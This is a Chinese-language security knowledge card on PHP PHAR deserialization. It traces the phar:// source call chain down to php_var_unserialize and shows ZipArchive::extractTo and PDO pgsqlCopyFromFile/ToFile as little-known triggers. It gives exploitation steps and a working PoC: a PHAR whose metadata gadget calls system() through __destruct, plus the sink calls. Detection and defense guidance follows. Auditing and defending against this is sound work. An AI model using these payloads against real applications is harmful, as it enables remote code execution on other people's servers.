---
id: web-php-deserialization-phar-sourcechain-zip-pgsql-sinks
title: PHAR 反序列化源码调用链与冷门触发面：ZipArchive::extractTo、PDO pgsqlCopyFromFile/ToFile 等 php_stream_open_wrapper 调用者
type: scenario
domain: web
path: web/php/deserialization
technique: phar-sourcechain-opens-wrapper-sinks
aliases:
- PHAR 源码分析
- phar_parse_metadata
- php_var_unserialize
- php_stream_open_wrapper_ex
- phar:// 触发函数
- ZipArchive extractTo phar
- pgsqlCopyFromFile phar
- PDO pgsql PHAR
tags:
- php
- phar
- deserialization
- source-code
- ziparchive
- pdo
- pgsql
- metadata
- pop-chain
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-08'
verification:
  verified_by: verifier-V278
  verified_at: '2026-11-08T00:57:31+08:00'
  notes: 已对照原文与 img/01-16 核对：phar_parse_metadata->php_var_unserialize、tar.c/zip.c 调用点、file.c php_stream_open_wrapper_ex、__HALT_COMPILER 长度 18、ZipArchive::extractTo->php_zip_extract_file->php_stream_open_wrapper、pgsqlCopyFromFile/ToFile 直接 php_stream_open_wrapper_ex 均与截图一致。卡片把源码链与两个冷门 sink 作为同一『php_stream_open_wrapper 触发面』技术讲，两个 sink 只是同一判定方法的示例，未拆分。PHP 8.0 不再自动反序列化 metadata 的版本边界正确。未复跑 PoC。dedup 候选上传图片 PHAR/file_get_contents 链为不同触发入口，非同链。
---

## 一句话结论

PHP 打开 `phar://` 路径时，`phar_parse_metadata()` 会对 manifest 中的 metadata 执行 `php_var_unserialize()`；触发点不限于 `file_get_contents`，任何最终调用 `_php_stream_open_wrapper_ex` 的函数都能触发，例如 `ZipArchive::extractTo('phar://...')`（zip 扩展的 `php_zip_extract_file`）和 `PDO::pgsqlCopyFromFile()/pgsqlCopyToFile()`（pgsql 驱动直接调用 `php_stream_open_wrapper_ex`），审计应以 wrapper 调用链而不是固定函数名单为准。

## 原理

- **反序列化入口**：`phar_parse_metadata()` 中执行 `php_var_unserialize(metadata, &p, p + zip_metadata_len, &var_hash)`，把 manifest 的 metadata 字节反序列化；该函数在 `phar.c`、`tar.c`（`phar_tar_process_metadata`）、`zip.c`（解析 zip 中央目录 comment 作为 metadata）等位置被调用。
- **完整打开链**：`php_stream_open_wrapper_ex()` → `php_stream_locate_url_wrapper()` 按 scheme 找到 `phar` wrapper → `wrapper->wops->stream_opener()` → `phar_wrapper_open_url()` → `phar_parse_url()` → `phar_open_from_filename()` → `phar_open_from_fp()` → `phar_parse_pharfile()` → `phar_parse_metadata()` → `php_var_unserialize()`。
- **Stub 要求**：`phar_open_from_fp()` 在 `halt_offset = 18` 处检查 `__HALT_COMPILER();`（strlen=18），并识别 zip/gzip/bzip2 魔数；不匹配则 `MAPPHAR_ALLOC_FAIL` 中止。因此 PHAR 文件必须带合法的 `__HALT_COMPILER();` stub，才能继续进入 metadata 反序列化。
- **触发面判定**：只要某函数最终调用 `php_stream_locate_url_wrapper` / `_php_stream_open_wrapper_ex`，并且路径可控，就可能触发 PHAR 反序列化。常见的有 `file_get_contents`、`md5_file`/`sha1_file`、`getimagesize`、`file_exists`、`stat`、`readfile`、`unlink` 等；本文补充两个不直观的 sink：
  - **ZipArchive::extractTo**：`ZIPARCHIVE_METHOD(extractTo)` 遍历要解压的文件，调用 `php_zip_extract_file(intern, pathto, ...)`；后者把目标路径交给 `php_stream_open_wrapper(fullpath, "wb", ...)`。当 `pathto` 为 `phar://test.phar/test` 时，写文件的目标路径会经过 phar wrapper，触发解析。
  - **PDO pgsqlCopyFromFile / pgsqlCopyToFile**：`pgsql_driver.c` 中分别用 `php_stream_open_wrapper_ex(filename, "rb"/"wb", 0, NULL, FG(default_context))` 打开 `$filename`，没有额外的 scheme 过滤；传入 `phar://...` 即触发。
- **为什么容易漏审**：审计者常只搜 `file_get_contents`/`include`，而数据库扩展、压缩扩展、图像扩展内部的 C 实现会间接调用 stream wrapper；这些 sink 的 PHP 参数（文件名/目标路径）同样可控。
- 版本边界：PHP 8.0 起 `phar://` 打开不再自动反序列化 metadata；上述行为主要适用于 PHP < 8.0，或应用显式反序列化 PHAR 内容/旧组件。

## 触发条件

- 目标 PHP < 8.0（或仍对 PHAR metadata 自动反序列化），`phar://` wrapper 未被禁用。
- 可控字符串能作为上述函数的路径参数（上传文件名、解压目标目录、数据库 `COPY FROM/TO` 文件名、图片/文件处理路径等）。
- 目标存在可利用的 gadget 类（`__wakeup`/`__destruct`/`__toString`/`__invoke` 等）。
- 攻击者能生成 PHAR 文件并放到目标可访问的路径（上传、共享目录、临时文件等）。

## 利用步骤

1. 审计 PHP 源码/C 扩展调用：搜索 `php_stream_open_wrapper`、`_php_stream_open_wrapper_ex`、`php_stream_locate_url_wrapper` 的调用点，反查 PHP 层函数；重点看 `ZipArchive::extractTo`、`PDO::pgsqlCopyFromFile/ToFile` 等参数可控的路径。
2. 确认路径参数是否过滤 `phar://`、是否可指向攻击者可控文件；如果过滤在开头匹配，可结合前缀绕过卡（见关联）。
3. 本地生成 PHAR：`setStub('<?php __HALT_COMPILER(); ?>')`、`setMetadata($gadget)`、添加任意文件、`stopBuffering()`；`phar.readonly=Off`。
4. 把 PHAR 文件上传/放置到目标路径（任意后缀均可，内容识别不依赖后缀）。
5. 调用目标 sink：例如 `$zip->extractTo('phar://uploads/exp.phar/test')` 或 `$pdo->pgsqlCopyFromFile('t', 'phar://uploads/exp.phar/x')`。
6. `phar_parse_metadata` 反序列化 metadata，触发 gadget（如 `__wakeup → __destruct → system`）；通过回显/文件/带外确认。
7. 若目标为 PHP 8+，检查应用是否显式 `unserialize(file_get_contents('phar://.../manifest'))`，或寻找旧扩展/组件路径。

## PoC

生成 PHAR（gadget 用最小 `__destruct` 示例）：

```php
<?php
class Evil {
    public function __destruct() { system('id > /tmp/phar_rce.txt'); }
}
$p = new Phar('/tmp/exp.phar');
$p->startBuffering();
$p->setStub('<?php __HALT_COMPILER(); ?>');
$p->setMetadata(new Evil());
$p->addFromString('x.txt', 'x');
$p->stopBuffering();
```

ZipArchive sink：

```php
<?php
$zip = new ZipArchive();
$res = $zip->open('test.zip');
$zip->extractTo('phar:///tmp/exp.phar/test');   // 目标路径进入 php_zip_extract_file → php_stream_open_wrapper
```

PDO pgsql sink：

```php
<?php
$pdo = new PDO('pgsql:host=127.0.0.1;dbname=postgres;user=x;password=x');
@$pdo->pgsqlCopyFromFile('test', 'phar:///tmp/exp.phar/x');
// 或 @$pdo->pgsqlCopyToFile('test', 'phar:///tmp/exp.phar/x');
```

```text
调用链（PHAR 打开）：
php_stream_open_wrapper_ex
  -> php_stream_locate_url_wrapper
  -> phar_ops.stream_opener
  -> phar_wrapper_open_url -> phar_parse_url
  -> phar_open_from_filename -> phar_open_from_fp
  -> phar_parse_pharfile -> phar_parse_metadata -> php_var_unserialize
```

## 变体与关联

- sink 变体：任何最终调用 `php_stream_open_wrapper` 的函数；文中列出的 `readgzfile`、`mime_content_type`、`imagecreatefrom*`、`simplexml_load_file`、`md5_file`、`getimagesize`、`unlink`、`stat`、`file_exists` 等均可作为候选，实际以源码调用链为准。
- 文件格式变体：PHAR 不要求 `.phar` 后缀；zip/tar/gzip/bzip2 容器也可被 phar 解析器识别（见 `phar_open_from_fp` 的魔数检查）。
- 触发位置变体：zip/tar 的 metadata 也可来自 comment/entry；`phar_parse_metadata` 在 tar/zip 路径同样被调用。
- 关联卡片：[[web-php-deserialization-phar-read-uploaded-image-pop-chain]]（上传图片后缀 + file_get_contents 触发）、[[web-php-deserialization-phar-upload-jpg-wakeup-eval]]、[[web-php-deserialization-compressed-phar-include-bypass]]（压缩 PHAR 过关键字过滤）、[[web-php-deserialization-phar-prefix-wrapper-bypass]]（phar:// 前缀过滤绕过）。
- 边界：PHP 8.0+ 不自动反序列化 metadata；`phar.readonly=On` 无法本地生成；路径参数被规范化/白名单限制；目标函数不解析 wrapper（如仅接受本地普通路径）；gadget 类不存在或 `allowed_classes` 限制时链失效。

## 检测与防御

- 检测：请求参数/上传文件名中出现 `phar://`（或 `compress.bzip2://phar://`、`php://filter/resource=phar://` 等嵌套形式）；上传文件即使后缀为图片也出现 `__HALT_COMPILER();`/PHAR manifest 结构；`ZipArchive::extractTo` 目标路径、`PDO::pgsqlCopyFromFile/ToFile` 文件名指向上传目录；反序列化相关类异常加载。
- 防御：禁用 `phar://` wrapper（或在上传目录禁用 PHAR 解析）；不要用用户可控字符串作为文件函数/数据库 COPY 的路径；对路径做 `realpath` 与目录白名单；升级 PHP 8+ 并避免显式反序列化 PHAR 内容。
- 加固：使用 `unserialize($data, ['allowed_classes' => [...]])` 白名单；移除 gadget 链；限制 PHP 进程对临时/上传目录的读写；监控 `__HALT_COMPILER` 特征与异常反序列化。
